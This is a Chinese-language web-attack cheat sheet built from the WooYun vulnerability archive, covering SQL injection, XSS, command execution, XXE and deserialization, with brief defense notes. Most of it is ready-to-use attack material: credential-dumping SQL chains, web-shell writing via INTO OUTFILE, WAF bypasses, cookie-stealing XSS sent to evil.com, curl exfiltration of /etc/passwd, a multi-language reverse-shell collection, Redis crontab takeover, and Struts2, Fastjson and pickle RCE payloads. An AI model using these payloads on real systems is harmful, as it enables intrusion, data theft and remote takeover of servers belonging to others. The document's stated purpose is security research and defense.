# Web注入安全

> 精炼自WooYun漏洞库三大注入类型知识库：SQL注入(27,732例)、XSS(7,532例)、命令执行(6,826例)
> 数据来源：wooyun_vulnerabilities.json (88,636条漏洞记录, 2010-2016)
> 本文档仅用于安全研究与防御参考

---

## 一、SQL注入

### 1.1 漏洞本质

```
输入验证缺失 → 动态SQL拼接 → 语义边界突破 → 数据库指令执行
```

**核心公式**：SQL注入 = 代码与数据边界混淆 + 用户输入提升为可执行SQL指令

### 1.2 检测方法

#### 高危注入点识别

| 向量类型 | 占比 | 典型场景 |
|---------|------|---------|
| 登录框 | 66% | 用户名/密码直接拼接 |
| 搜索框 | 64% | LIKE语句模糊匹配 |
| POST参数 | 60% | 表单提交 |
| HTTP头 | 26% | UA/Referer/XFF |
| GET参数 | 24% | URL参数 |
| Cookie | 12% | 会话标识处理 |

**高频参数名**：`id`, `sort_id`, `username`, `password`, `type`, `action`, `page`, `name`；ASP.NET特有：`__viewstate`, `__eventvalidation`

#### 快速检测流程

```
1. 单引号/双引号测试 → 观察报错
2. 数学运算: id=2-1 / id=1*1 → 观察等价性
3. 布尔测试: and 1=1 / and 1=2 → 对比响应差异
4. 时间延迟: and sleep(5) → 观察响应时间
5. 排序探列: order by N → 递增至报错
```

#### 数据库指纹识别

| 数据库 | 延迟函数 | 系统表 | 错误特征 |
|-------|---------|-------|---------|
| MySQL | `sleep(N)` / `benchmark()` | `information_schema.tables` | "You have an error in your SQL syntax" |
| MSSQL | `WAITFOR DELAY '0:0:N'` | `sysobjects` | "Unclosed quotation mark" |
| Oracle | `dbms_pipe.receive_message('a',N)` | `all_tables` | "ORA-00942" |
| Access | 笛卡尔积延迟 | `MSysObjects` | "Microsoft JET Database Engine" |

### 1.3 注入技术与Payload

#### 布尔盲注

```sql
id=1 AND 1=1    -- True
id=1 AND 1=2    -- False
id=1' AND '1'='1
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
-- MySQL RLIKE
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
```

#### 时间盲注

```sql
-- MySQL（嵌套延迟实战技巧）
id=(select(2)from(select(sleep(8)))v)
id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
-- Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1
```

#### 联合查询

```sql
id=1 ORDER BY N--              -- 探列数
id=-1 UNION SELECT 1,2,3,4,5--  -- 确定回显位
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

#### 报错注入

```sql
-- MySQL extractvalue/updatexml
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
-- MySQL floor
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
-- CHAR函数绕过字符过滤
' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+(SELECT CHAR(49))+CHAR(113))) AND 'a'='a
```

### 1.4 WAF/过滤绕过技巧

#### 内联注释（最常用）

```sql
/*!50000union*//*!50000select*/1,2,3
/*!UNION*//*!SELECT*/1,2,3
-- DeDeCMS绕过实例
/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x7C,userid,0x3a,pwd,0x7C),5,6,7,8,9+from+`#@__admin`#
```

#### 编码绕过

```sql
-- 十六进制: 'admin' -> 0x61646d696e
SELECT * FROM users WHERE name=0x61646d696e
-- URL双重编码: %252f -> / , %2527 -> '
-- Unicode: %u0027 -> '
```

#### 大小写 + 空白符替换

```sql
UnIoN SeLeCt                    -- 大小写混淆
UNION/**/SELECT/**/1,2,3        -- 注释替代空格
UNION%09SELECT                  -- Tab替代
UNION%0ASELECT                  -- 换行替代
```

#### 函数替代

```sql
SUBSTRING -> MID / SUBSTR / LEFT / RIGHT
CONCAT -> CONCAT_WS / ||
CHAR(65) -> 字符A
```

#### 逻辑等价替换

```sql
AND 1=1 -> && 1=1 -> & 1
OR 1=1  -> || 1=1 -> | 1
id=1 -> id LIKE 1 / id BETWEEN 1 AND 1 / id IN(1) / id REGEXP '^1$'
-- 引号绕过
'admin' -> CHAR(97,100,109,105,110) -> 0x61646d696e
```

#### 宽字节注入（GBK编码）

```
%bf%27 绕过 addslashes()   -- GBK下多字节字符吞掉反斜杠
```

#### HTTP层绕过

```
参数污染: id=1&id=2             -- 重复参数混淆
分块传输: Transfer-Encoding: chunked
X-Forwarded-For注入 / Cookie注入  -- 非常规注入点
```

### 1.5 利用链

#### MySQL完整利用链

```sql
-- 1.信息 -> 2.库 -> 3.表 -> 4.列 -> 5.数据 -> 6.文件 -> 7.Shell
union select 1,database(),version(),user(),5--
union select 1,group_concat(schema_name),3 from information_schema.schemata--
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--
union select 1,group_concat(username,0x3a,password),3 from users--
union select 1,load_file('/etc/passwd'),3--
union select 1,'<?php @system($_POST[cmd]);?>',3 into outfile '/var/www/html/shell.php'--
```

#### MSSQL完整利用链

```sql
union select 1,@@version,db_name(),system_user,5--
union select 1,name,3 from master..sysdatabases--
union select 1,name,3 from sysobjects where xtype='U'--
union select 1,username+':'+password,3 from users--
-- 命令执行（需sa权限）
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
exec master..xp_cmdshell 'whoami'--
```

#### Oracle利用链

```sql
union select banner,null from v$version where rownum=1--
union select table_name,null from all_tables where rownum<=10--
union select username||':'||password,null from users--
```

#### Access盲注利用链

```sql
-- 无information_schema，需获取源码或猜表名
id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97
-- 多用户枚举用NOT IN
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
```

### 1.6 防御措施

```python
# 参数化查询（首选）
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))  # Python
```

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");        // PHP PDO
```

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); // Java
```

- 参数化查询/预编译语句（首选）、存储过程（次选）
- 白名单输入验证 + 数字型参数强制类型转换
- 数据库最小权限 + 错误信息隐藏 + WAF部署

---

## 二、XSS跨站脚本

### 2.1 漏洞本质

```
用户输入(数据) -> 未编码输出 -> 浏览器解析为代码 -> 脚本执行
```

**核心公式**：XSS = 信任边界突破 + 输出上下文混淆（数据在HTML/JS/CSS/URL中语义变化）

### 2.2 检测方法

#### 高危输出点

| 输出点 | 触发条件 | 典型场景 |
|-------|---------|---------|
| 用户昵称/签名 | 页面加载 | 个人主页、评论、好友列表 |
| 搜索框回显 | 搜索操作 | 搜索结果页 |
| 评论/留言 | 内容展示 | 论坛、博客、商品评价 |
| 文件名/描述 | 文件列表 | 网盘、相册 |
| 邮件正文/标题 | 打开邮件 | 邮箱系统 |
| 订单备注 | 后台查看 | 电商后台、工单系统 |

**隐蔽输出点**（易遗漏）：HTTP头(XFF/UA写入日志)、WAP提交PC展示、客户端昵称Web渲染、草稿箱/审核列表

#### 上下文快速判断

```
输出在 <script> 内？ -> JS上下文（检查引号类型）
输出在属性值中？    -> 属性上下文（检查属性类型）
输出在标签内容中？  -> HTML上下文（检查特殊标签textarea/title）
输出在URL中？       -> URL上下文（检查协议限制）
输出在CSS中？       -> CSS上下文（检查expression支持）
```

### 2.3 上下文Payload

#### HTML标签内容

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### HTML属性值

```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### JavaScript字符串

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### URL上下文

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 2.4 WAF/过滤绕过技巧

#### 编码绕过

```html
<!-- HTML实体 -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
<!-- Base64 + data协议 -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<!-- CSS编码(IE) -->
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

#### 标签/属性变形

```html
<ScRiPt>alert(1)</sCrIpT>              <!-- 大小写混淆 -->
<script/src=//xss.com/x.js>            <!-- 斜杠替代空格 -->
<img src=x onerror=alert(1)>           <!-- 无引号 -->
<scrscriptipt>alert(1)</scrscriptipt>  <!-- 双写绕过 -->
<scr\x00ipt>alert(1)</script>          <!-- 空字符绕过 -->
```

#### 替代事件处理器

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

#### WAF特定绕过

```html
.<script src=http://localhost/1.js>.    <!-- 安全宝：前后加点号 -->
<!--[if true]><img onerror=alert(1) src=--> <!-- 注释干扰 -->
```

#### 长度限制绕过

```html
<script src=//xss.pw/j>                <!-- 最短外部加载 -->
<!-- DOM拼接 -->
<script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
<!-- 字符串拼接绕过关键字 -->
<script>window['al'+'ert'](1)</script>
<!-- fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### HTTPOnly绕过

- Flash接口获取用户信息替代Cookie
- 转为CSRF方式：直接执行敏感操作（改密码、加管理员、读token）

### 2.5 利用链

#### Cookie窃取

```html
<script>new Image().src="https://evil.com/c?="+document.cookie</script>
<img src=x onerror="new Image().src='https://evil.com/c?='+document.cookie">
<script>fetch('https://evil.com/c?='+document.cookie)</script>
```

#### DOM XSS关键源与汇

**危险源**：`location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`

**危险汇**：`innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`

#### XSS蠕虫核心逻辑

```javascript
// 1.获取当前用户身份(cookie/token)
// 2.构造包含自身payload的内容
// 3.自动发布/分享（AJAX POST）
// 4.触发条件：查看/访问即传播
function worm(){
    jQuery.post("/api/post", {"content": "<自传播payload>"})
}
worm()
```

#### 组合利用模式

```
XSS + CSRF -> 获取Token执行管理操作
XSS + SQLi -> 盲打获取Cookie -> 后台注入
XSS -> 账号劫持 -> 权限提升 -> 蠕虫传播
XSS盲打(留言/工单/反馈) -> 获取后台管理员Cookie
```

### 2.6 防御措施

- **输出编码**（核心）：HTML上下文用HTML实体，JS上下文用JS编码，URL上下文用URL编码
- CSP策略限制脚本来源
- HTTPOnly保护Cookie
- 白名单输入验证（避免黑名单，总有遗漏）
- **常见失误**：只过滤script标签、只过滤小写、前端过滤可抓包绕过、单次过滤被双写绕过

---

## 三、命令执行

### 3.1 漏洞本质

```
用户输入(数据) -> 未净化拼接 -> 进入系统命令/代码执行上下文 -> OS指令执行
```

**核心公式**：命令执行 = 数据流污染 + 执行上下文（Shell/代码/表达式）

### 3.2 检测方法

#### 高频入口点

| 入口类型 | 占比 | 典型场景 |
|---------|------|---------|
| 文件操作 | 68% | 上传、读取、解压 |
| 系统命令函数 | 62% | exec/system/shell_exec |
| Struts2框架 | 50% | OGNL表达式注入 |
| SSRF | 30% | URL参数传递 |
| ping命令 | 26% | 网络诊断功能 |
| 图片处理 | 24% | ImageMagick |
| Java反序列化 | 20% | WebLogic/JBoss |

#### 命令拼接符号

| 符号 | 含义 | 执行逻辑 |
|------|------|---------|
| `;` | 分隔符 | 顺序执行，不管前命令结果 |
| `\|` | 管道 | 前输出作为后输入 |
| `` ` `` / `$()` | 命令替换 | 执行内部命令并返回结果 |
| `\|\|` | 逻辑或 | 前失败才执行后 |
| `&&` | 逻辑与 | 前成功才执行后 |
| `%0a` / `%0d%0a` | 换行 | URL编码换行分隔 |

#### 无回显检测

```bash
# DNSLog外带
ping `whoami`.xxxxx.ceye.io
curl http://`whoami`.xxxxx.ceye.io

# HTTP外带
curl https://evil.com/?d=`cat /etc/passwd | base64 | tr '\n' '-'`
curl -X POST -d "data=$(cat /etc/passwd)" https://evil.com/c

# 时间延迟
sleep 5
ping -c 5 127.0.0.1

# 文件写入Web目录
echo "test" > /var/www/html/proof.txt
```

### 3.3 绕过技巧

#### 空格绕过

```bash
cat${IFS}/etc/passwd          # ${IFS}内部字段分隔符
cat$IFS$9/etc/passwd          # $9为空的位置参数
cat%09/etc/passwd             # Tab制表符
cat</etc/passwd               # 重定向符
{cat,/etc/passwd}             # 大括号扩展
```

#### 关键字绕过

```bash
# 引号/反斜杠分割
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# 变量拼接
a=c;b=at;$a$b /etc/passwd

# 通配符
/bin/ca* /etc/passwd
/bin/c?t /etc/passwd
/???/??t /etc/passwd
```

#### cat命令替代

```bash
tac  head  tail  more  less  nl  sort  uniq  od -c  xxd  base64  rev  paste
```

#### 编码绕过

```bash
# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# Hex
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### 3.4 利用链与Payload

#### 框架/组件漏洞Payload

**ImageMagick (CVE-2016-3714)**：

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/ATTACKER/8080 0>&1 &")'
pop graphic-context
```

**Struts2 S2-045**：

```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

**Struts2 OGNL通用命令执行**：

```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
```

**ElasticSearch Groovy沙箱绕过**：

```json
{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

**Redis未授权写SSH公钥/Crontab**：

```bash
redis-cli -h target
config set dir /root/.ssh && config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n" && save
# 或写crontab
config set dir /var/spool/cron && config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/8080 0>&1\n\n" && save
```

#### 反弹Shell集合

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# NC无-e参数
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER",PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}
```

#### PHP危险函数层级

| 层级 | 函数 | 能力 |
|-----|------|-----|
| L1代码级 | `eval()`, `assert()(PHP5)`, `create_function()`, `preg_replace(/e)` | PHP代码执行 |
| L2 Shell级 | `system()`, `passthru()`, `shell_exec()`, 反引号 | 系统命令有回显 |
| L3进程级 | `exec()`, `popen()`, `proc_open()`, `pcntl_exec()` | 子进程执行 |
| L4回调级 | `call_user_func()`, `array_map()` | 间接函数调用 |

#### PHP WAF绕过技巧

```php
// 字符串拼接
$func = 'sys'.'tem'; $func('whoami');
// 变量函数
$a='sys';$b='tem';($a.$b)('whoami');
// 编码混淆
base64_decode('c3lzdGVt')           // system
str_rot13('flfgrz')                 // system
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) // system
// 字符串操作
strrev('metsys')('whoami');
implode('',array('s','y','s','t','e','m'))('whoami');
```

#### disable_functions绕过

| 方法 | 原理 | 条件 |
|-----|------|-----|
| LD_PRELOAD | 劫持系统库函数，mail()触发加载恶意.so | 可上传.so + mail()可用 |
| Shellshock | Bash<=4.3环境变量注入 | 旧版Bash |
| Apache Mod_CGI | .htaccess配置CGI执行 | Apache + AllowOverride |
| PHP-FPM/FastCGI | 修改PHP配置执行代码 | 可访问FPM端口/SSRF |
| ImageMagick | delegate功能命令执行 | 使用IM处理图片 |
| Windows COM | WScript.Shell组件 | Windows + COM扩展 |

**LD_PRELOAD核心利用**：

```php
// 上传恶意.so（劫持geteuid函数，内部调用system()）
putenv("LD_PRELOAD=/tmp/exploit.so");
mail("a@a.com","test","test");  // mail()启动sendmail进程 -> 加载.so -> 执行命令
```

### 3.5 防御措施

```php
// 最佳实践：白名单验证 + escapeshellarg
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    system("ping " . escapeshellarg($_GET['ip']));
}
```

- 避免直接调用系统命令，使用语言内置函数替代
- 参数化执行（数组传参），禁止字符串拼接
- `escapeshellarg()` + `escapeshellcmd()` 转义
- 白名单验证输入 + 类型检查
- `disable_functions` 禁用危险函数（注意绕过风险）
- 最小权限运行Web服务 + 容器/chroot隔离
- 及时更新框架组件（Struts2/WebLogic/ImageMagick等）

---

## 四、XXE (XML外部实体注入)

### 4.1 漏洞本质

```
XML输入 -> 解析器启用DTD/外部实体 -> 实体引用被解析执行 -> 文件读取/SSRF/RCE
```

**核心公式**：XXE = XML解析器允许外部实体引用 + 用户可控XML输入

### 4.2 检测方法

**高危入口点识别**

| 入口类型 | 检测特征 | 典型场景 |
|----------|----------|----------|
| API接口 | Content-Type含`text/xml`或`application/xml` | RESTful API、SOAP Web服务 |
| 文件上传 | SVG图片、DOCX/XLSX/PPTX(本质ZIP含XML) | 头像上传、文档导入 |
| 数据解析 | XML配置导入、RSS/Atom订阅 | 后台管理、聚合功能 |
| 协议交互 | SAML认证、WebDAV、XMPP | SSO登录、文件管理 |

**快速检测流程**

```
1. 识别XML处理接口 → 修改Content-Type为application/xml测试
2. 发送基础DTD声明 → 观察是否解析(报错差异)
3. 尝试外部实体引用 → file协议读取已知文件
4. 无回显时 → OOB外带(DNS/HTTP回连)
```

### 4.3 经典Payload

#### 文件读取（有回显）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### SSRF内网探测

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

#### 盲注 - OOB外带数据

```xml
<!-- 外部DTD (attacker服务器托管evil.dtd) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- evil.dtd内容: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

#### 报错回显

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %e;
]>
```

### 4.4 绕过技巧

| 绕过方式 | 方法 | 适用场景 |
|----------|------|----------|
| 编码绕过 | UTF-16BE/LE、UTF-7编码XML | WAF基于ASCII模式匹配 |
| 参数实体嵌套 | `%entity;`替代`&entity;` | 过滤通用实体`&` |
| XInclude | `<xi:include href="file:///etc/passwd"/>` | 无法控制DOCTYPE声明 |
| SVG嵌入 | SVG文件内嵌XXE实体 | 仅允许图片上传 |
| DOCX/XLSX嵌入 | 修改Office文档内`[Content_Types].xml` | 文档上传功能 |
| CDATA包裹 | 用CDATA段绕过特殊字符限制 | 读取含XML特殊字符的文件 |

### 4.5 防御措施

```java
// Java: 禁用DTD和外部实体
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

- 禁用DTD处理和外部实体解析（首选）
- 使用JSON替代XML进行数据交换
- 输入白名单校验、升级XML解析库
- WAF规则拦截`<!DOCTYPE`/`<!ENTITY`/`SYSTEM`关键字

---

## 五、反序列化漏洞

### 5.1 漏洞本质

```
序列化数据(不可信) -> 反序列化函数 -> 对象重构触发魔术方法/回调 -> 恶意逻辑执行
```

**核心公式**：反序列化RCE = 可控序列化输入 + 危险类在classpath/作用域内 + 可达的利用链(Gadget Chain)

### 5.2 Java反序列化

**检测标识**

```
二进制流: AC ED 00 05 (hex头部)
Base64:   rO0AB (编码后头部)
常见位置: Cookie、ViewState、JMX、RMI、T3协议、HTTP Body
```

**利用链速查**

| 利用链 | 依赖库 | 触发方式 | 工具 |
|--------|--------|----------|------|
| Commons-Collections | commons-collections 3.x/4.x | InvokerTransformer | ysoserial |
| Spring | spring-core + spring-beans | MethodInvokeTypeProvider | ysoserial |
| Fastjson | fastjson < 1.2.68 | `@type` autoType | 手工/专用工具 |
| Jackson | jackson-databind | 多态反序列化 | ysoserial |
| JNDI注入 | JDK < 8u191 | LDAP/RMI远程类加载 | JNDIExploit/marshalsec |

**Fastjson经典Payload**

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// 1.2.47 缓存绕过
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/","autoCommit":true}}
```

**工具链**

```bash
# ysoserial生成payload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64

# JNDI注入服务
java -jar JNDIExploit.jar -i attacker_ip

# marshalsec启动恶意LDAP/RMI
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"
```

### 5.3 PHP反序列化

**检测标识**

```
格式: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
关键函数: unserialize(), phar://协议触发
```

**魔术方法利用链**

| 方法 | 触发时机 | 利用方式 |
|------|----------|----------|
| `__wakeup()` | unserialize()调用时 | 属性覆盖→危险操作 |
| `__destruct()` | 对象销毁时 | 文件删除/写入/命令执行 |
| `__toString()` | 对象被当字符串使用 | 拼接进危险函数 |
| `__call()` | 调用不存在的方法 | 链式调用跳板 |

**POP链构造思路**

```
1. 找入口: __wakeup()/__destruct() 中调用$this->xxx属性的方法
2. 跳板: 通过__toString()/__call()/__get() 链接到其他类
3. 终点: 到达system()/eval()/file_put_contents()等危险函数
4. 构造: 控制属性值使链路完整连通
```

**Phar反序列化（无需unserialize调用）**

```php
// 文件操作函数触发phar://反序列化
file_exists('phar://upload/evil.phar');
is_dir('phar://upload/evil.jpg');      // 伪装为图片后缀
```

### 5.4 Python反序列化

**危险函数**

```python
import pickle, yaml, marshal

# pickle - 最常见
pickle.loads(data)      # 反序列化
pickle.load(file)       # 从文件反序列化

# yaml - 需要Loader
yaml.load(data)         # 默认不安全(旧版本)
yaml.load(data, Loader=yaml.FullLoader)  # 限制加载

# marshal - 字节码级别
marshal.loads(data)     # 加载代码对象
```

**pickle RCE Payload**

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# 等价手工构造:
# pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
```

**yaml RCE Payload**

```yaml
!!python/object/apply:os.system ['whoami']
# 或
!!python/object/new:subprocess.check_output [['whoami']]
```

### 5.5 防御措施

```java
// Java: ObjectInputStream白名单过滤
ObjectInputStream ois = new ObjectInputStream(input) {
    @Override protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!allowedClasses.contains(desc.getName())) throw new InvalidClassException("Blocked: " + desc.getName());
        return super.resolveClass(desc);
    }
};
```

- **Java**: 升级组件(Fastjson/Jackson/Commons-Collections)、关闭autoType、使用白名单反序列化过滤器
- **PHP**: 避免unserialize()处理用户输入、使用json_decode替代、禁用phar://协议
- **Python**: 使用`yaml.safe_load()`替代`yaml.load()`、禁止pickle处理不可信数据、使用JSON
- **通用**: 避免原生序列化格式传输数据，统一使用JSON；对反序列化入口做签名/HMAC校验

---

## 附录：SQLMap速查

```bash
# 基础检测
sqlmap -u "http://t/p.php?id=1" --batch
# POST请求
sqlmap -u "http://t/login.php" --data="user=t&pass=t" --batch
# Cookie/HTTP头注入
sqlmap -u "http://t/p.php" --cookie="id=1" --level=2 --batch
sqlmap -u "http://t/p.php" --headers="X-Forwarded-For: 1" --level=3 --batch
# 绕过WAF
sqlmap -u "http://t/p.php?id=1" --tamper=space2comment,between --batch
# 数据提取链
sqlmap ... --dbs
sqlmap ... -D db --tables
sqlmap ... -D db -T tbl --columns
sqlmap ... -D db -T tbl -C c1,c2 --dump
```
